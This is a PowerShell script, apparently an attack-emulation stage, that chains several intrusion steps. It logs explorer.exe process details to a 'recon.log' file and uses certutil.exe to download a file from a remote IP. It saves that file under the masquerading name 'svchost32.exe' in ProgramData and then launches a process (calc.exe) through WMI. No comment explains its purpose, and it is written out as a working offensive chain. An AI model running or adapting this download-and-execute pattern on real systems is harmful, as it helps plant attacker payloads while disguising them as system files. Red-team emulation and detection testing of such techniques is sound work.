[CmdletBinding()]
param(
    [string]$EndpointUrl = "https://198.51.100.196:443/assets/update.dat",
    [string]$PayloadPath = "C:\ProgramData\svchost32.exe",
    [int]$TimeoutSec = 55
)
$ErrorActionPreference = "Continue"

try {
    Write-Verbose "Collecting process inventory"
    Get-CimInstance -ClassName Win32_Process | Where-Object { $_.Name -eq "explorer.exe" } | Select-Object ProcessId,Name,CommandLine | Out-File "$env:APPDATA\recon.log" -Append
    certutil.exe -urlcache -split -f $EndpointUrl $PayloadPath
    $StageResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" }
    Write-Verbose ("Process ID: " + $StageResult.ProcessId)
}
catch {
    Write-Warning "WMI/LOLBin stage failed: $($_.Exception.Message)"
}

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
